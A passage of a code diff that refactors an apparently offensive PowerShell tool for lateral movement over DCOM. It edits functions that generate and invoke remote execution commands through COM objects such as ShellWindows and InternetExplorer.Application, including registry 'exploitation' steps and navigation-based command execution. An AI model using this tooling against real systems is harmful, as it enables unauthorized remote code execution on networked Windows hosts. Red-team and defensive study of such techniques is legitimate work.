                         Invoke-DCOMAnalyzer -ObjectName $ObjectName -MaxDepth $MaxDepth -MaxResults $MaxResults -RemoteIP $RemoteIP -CheckAccessOnly:$CheckAccessOnly -SkipRegAuth:$SkipRegAuth -SkipSameProperyName:$SkipSameProperyName|Out-Null
+                        $ScannedObjects[$RemoteIP].Add($ObjectName)|Out-Null
                         if($SaveState) {
-                            $ScannedObjects[$RemoteIP].Add($ObjectName)|Out-Null
                             $ScanStateStream = New-Object IO.StreamWriter -ArgumentList ($global:ScanStateFileName)
                             $ScanStateStream.Write((ConvertTo-CliXml -InputObject $ScannedObjects))
                             $ScanStateStream.Flush()
@@ -3820,7 +3927,9 @@ function Get-ExecutionCommand {
                 if(!(Start-DefaultTasks -Type StartTask -RemoteIP $RemoteIP -Username $Username -Password $Password)) {
                     continue
                 }
-                $ObjectName = Wrap-CLSID -ObjectName $ObjectName
+                if(is-GUID -ObjectName $ObjectName) {
+                    $ObjectName = Wrap-CLSID -ObjectName $ObjectName
+                }
 
                 if(!$SkipRegAuth) {  # If SkipRegAuth is not specified
                     if(!(Test-RegistryConnection -RemoteIP $RemoteIP -Hive HKLM -CheckWritePermissions:$AutoGrant)) {
@@ -3858,18 +3967,51 @@ function Get-ExecutionCommand {
                 }
 
                 $OverloadDefinitions = Get-FunctionParameters -ObjectPath ((Skip-LastItem -Array $SplittedPath) -join ".") -FunctionName $SplittedPath[-1]
-                $cmd = _Generate-ExecutionCommand -ObjectName $ObjectName -ObjectPath $ObjectPath -OverloadDefinitions $OverloadDefinitions
-                if(!$cmd) {
-                    Write-Log -Level ERROR -Message "$($ObjectPath) not found!"
+                
+                if(!$OverloadDefinitions) {
+                    Write-Log -Level ERROR -Message "$($ObjectPath) - function not found!"
                     continue
                 }
-                if(is-GUID -ObjectName $ObjectName) {
-                    $clsid, $ProgID, $CLSIDCommand, $ProgIdCommand = @($ObjectName, "", $cmd, "")
+
+                if(!$SkipRegAuth) { # If SkipPermissionChecks is not specified
+                    $CLSID, $ProgID, $VersionIndependentProgID, $ProgName, $Library_32, $Library_64 = Get-ObjectInfo -ObjectName $ObjectName # Collect object info
+                    $CLSIDCommand = _Generate-ExecutionCommand -ObjectName $CLSID -ObjectPath $ObjectPath -OverloadDefinitions $OverloadDefinitions -forceVerbose
+                    if(!$CLSIDCommand) {
+                        Write-Log -Level ERROR -Message "$($ObjectPath) is unreachable!"
+                        continue
+
+                    }
+                    $ProgIdCommand = _Generate-ExecutionCommand -ObjectName $ProgID -ObjectPath $ObjectPath -OverloadDefinitions $OverloadDefinitions -forceVerbose
                 } else {
-                    $clsid, $ProgID, $CLSIDCommand, $ProgIdCommand = @("", $ObjectName, "", $cmd)
+                    $ProgName = ""
+                    $VersionIndependentProgID = ""
+                    $Library_32 = ""
+                    $Library_64 = ""
+                    if(is-GUID -ObjectName $ObjectName) {
+                        $CLSIDCommand = _Generate-ExecutionCommand -ObjectName $ObjectName -ObjectPath $ObjectPath -OverloadDefinitions $OverloadDefinitions -forceVerbose
+                        $ProgIDCommand = ""
+                        $CLSID = $ObjectName
+                        $ProgID = ""
+                    } else {
+                        $ProgIDCommand = _Generate-ExecutionCommand -ObjectName $ObjectName -ObjectPath $ObjectPath -OverloadDefinitions $OverloadDefinitions -forceVerbose
+                        $CLSIDCommand = ""
+                        $ProgID = $ObjectName
+                        $CLSID = ""
+                    }
                 }
-                Add-ResultRow -ResultRow @($RemoteIP, $false, $clsid, $ProgID, $ObjectPath, $CLSIDCommand, $ProgIdCommand, $false, $false)
-                Write-Log -Level INFO -Message $cmd
+
+                
+                
+
+                Add-ResultRow -ResultRow @($RemoteIP, $ProgName, $CLSID, $ProgID, $VersionIndependentProgID, $ObjectPath, $CLSIDCommand, $ProgIdCommand, $Library_32, $Library_64)
+                
+                if($CLSIDCommand) {
+                    Write-Log -Level INFO -Message "Execution Command (CLSID): $($CLSIDCommand)"
+                }
+
+                if($ProgIDCommand) {
+                    Write-Log -Level INFO -Message "Execution Command (ProgID): $($ProgIDCommand)"
+                }
         
             } catch {
                 Write-Log -Level ERROR -Message $_
@@ -3988,7 +4130,9 @@ function Invoke-ExecutionCommand {
                 if(!(Start-DefaultTasks -Type StartTask -RemoteIP $RemoteIP -Username $Username -Password $Password)) {
                     continue
                 }
-                $ObjectName = Wrap-CLSID -ObjectName $ObjectName
+                if(is-GUID -ObjectName $ObjectName) {
+                    $ObjectName = Wrap-CLSID -ObjectName $ObjectName
+                }
                 if(!$SkipRegAuth) {  # If SkipRegAuth is not specified
                     if(!(Test-RegistryConnection -RemoteIP $RemoteIP -Hive HKLM -CheckWritePermissions:$AutoGrant)) {
                         Write-Log -Level ERROR -Message "Can't interact with HKLM! Please try to use -SkipRegAuth flag"
@@ -4145,12 +4289,12 @@ function Invoke-RegisterRemoteSchema {
             $Command = $Command.Replace('"', "%2522").Replace("'", "%2527")
         }
 
-        $DCOMWithNavigationFunctionality = @(
-            "{C08AFD90-F2A1-11D1-8455-00A0C91F3880}", # ShellBrowserWindow
-            "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}", # ShellWindows
-            "InternetExplorer.Application",
-            "{D5E8041D-920F-45e9-B8FB-B1DEB82C6E5E}" # ielowutil.exe
-        )
+        $DCOMWithNavigationFunctionality = @{
+            "{C08AFD90-F2A1-11D1-8455-00A0C91F3880}" = @("Navigate", "Navigate2", "Document.Application.Open"); # ShellBrowserWindow
+            "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}" = @("Navigate", "Navigate2", "Document.Application.Open"); # ShellWindows
+            "InternetExplorer.Application" = @("Navigate", "Navigate2"); # Internet Explorer
+            "{D5E8041D-920F-45e9-B8FB-B1DEB82C6E5E}" = @("Navigate", "Navigate2") # ielowutil.exe
+        }
 
         $IEFirstRun = @{
             ExploitationFunction="Write-RegDWORD"; Rev2SelfFunction="Remove-RegString";
@@ -4265,20 +4409,17 @@ function Invoke-RegisterRemoteSchema {
                         $global:usergroups = Get-UserGroup -RemoteIP $RemoteIP -Username $Username.Split("\")[-1]
                     }
                     $DefaultChecks = Invoke-DefaultRightAnalyzer -RemoteIP $RemoteIP -AutoGrant:$AutoGrant
-                    $DCOMList = New-Object System.Collections.ArrayList
-                    foreach($dcom in $DCOMWithNavigationFunctionality) {
-                        if(!(is-GUID $dcom)) {
-                            $dcom = Get-CLSID -ProgID $dcom
-                        }
-                        $CLSIDChecks = Invoke-DCOMObjectRightAnalyzer -RemoteIP $RemoteIP -ObjectName $dcom -DefaultChecks:$DefaultChecks -AutoGrant:$AutoGrant
+                    $AccessibleDCOMList = New-Object System.Collections.ArrayList
+                    foreach($ObjectName in $DCOMWithNavigationFunctionality.Keys) {
+                        $CLSIDChecks = Invoke-DCOMObjectRightAnalyzer -RemoteIP $RemoteIP -ObjectName $ObjectName -DefaultChecks:$DefaultChecks -AutoGrant:$AutoGrant
                         if(!$Force -and ((!$DefaultChecks -and !$CLSIDChecks) -or ($DefaultChecks -and !$CLSIDChecks))) {
-                            Write-Log -Level ERROR -Message "You dont have permissions to access $($dcom) object!"
+                            Write-Log -Level ERROR -Message "You dont have permissions to access $($ObjectName) object!"
                             continue
                         }
-                        $DCOMList.Add($dcom)|Out-Null
+                        $AccessibleDCOMList.Add($ObjectName)|Out-Null
                     }
-                    if(!$DCOMList) {
-                        Write-Log -Level ERROR -Message "The user has not granted to launch the used DCOM objects."
+                    if(!$AccessibleDCOMList) {
+                        Write-Log -Level ERROR -Message "Your user has not granted to launch the used DCOM objects."
                         return
                     }
                     $isHKLM = $true
@@ -4308,9 +4449,6 @@ function Invoke-RegisterRemoteSchema {
                     }
                 }
 
-                
-                
-                
 
                 $ExploitationSequences = New-Object System.Collections.ArrayList
                 
@@ -4331,9 +4469,9 @@ function Invoke-RegisterRemoteSchema {
                 }
                 
                 $isCommandExecuted = $false
-                foreach($dcom in $DCOMList) {
-                    if(Start-COMObjectInstance -ObjectName $dcom -RemoteIP $RemoteIP) {
-                        foreach($NavigationFunctionPath in @("Navigate", "Navigate2", "Document.Application.Open")) {
+                foreach($ObjectName in $AccessibleDCOMList) {
+                    if(Start-COMObjectInstance -ObjectName $ObjectName -RemoteIP $RemoteIP) {
+                        foreach($NavigationFunctionPath in $DCOMWithNavigationFunctionality[$ObjectName]) {
                             $ObjectPath = ""
                             $SplittedPath = $NavigationFunctionPath.Split(".")
                             $FunctionName = $SplittedPath[-1]
@@ -4358,7 +4496,7 @@ function Invoke-RegisterRemoteSchema {
                         }
                         
                         if(Quit-COMObject) {
-                            Write-Log -Level VERBOSE -Message "$($dcom) quitted successfully" 
+                            Write-Log -Level VERBOSE -Message "$($CLSID) quitted successfully" 
                         }
                     }
                     if($isCommandExecuted) {
